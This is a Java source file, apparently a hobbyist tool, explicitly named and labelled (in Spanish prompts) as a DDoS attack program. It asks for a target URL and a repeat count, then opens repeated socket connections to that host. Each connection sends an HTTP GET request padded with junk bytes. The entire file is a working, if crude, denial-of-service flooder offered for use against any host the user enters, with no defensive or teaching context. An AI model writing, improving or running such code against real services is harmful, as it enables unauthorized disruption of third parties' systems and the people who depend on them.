package DDos_Atack;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Scanner;

public class DDos_Atack {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.print("¿Desea realizar un ataque DDoS? (s/n): ");
        String respuesta = scanner.nextLine();

        if (respuesta.equalsIgnoreCase("s")) {
            System.out.print("Ingresa la URL completa del host: ");
            String url = scanner.nextLine();

            try {
                URI uri = new URI(url);
                String host = uri.getHost();
                int port = uri.getPort();
                if (port == -1) {
                    port = uri.getScheme().equalsIgnoreCase("https") ? 443 : 80;
                }

                InetAddress inetAddress = InetAddress.getByName(host);

                System.out.print("Ingresa el número de repeticiones: ");
                int repeticiones = scanner.nextInt();

                for (int i = 0; i < repeticiones; i++) {
                    Socket socket = new Socket(inetAddress, port);
                    OutputStream outputStream = socket.getOutputStream();

                    String requestData = "X".repeat(1024);
                    String request = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
                    String payload = request + requestData;
                    byte[] payloadBytes = payload.getBytes();

                    outputStream.write(payloadBytes);
                    outputStream.flush();

                    socket.close();
                }
            } catch (URISyntaxException e) {
                System.out.println("URL inválida: " + url);
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("SALIENDO...");
        }
    }
}
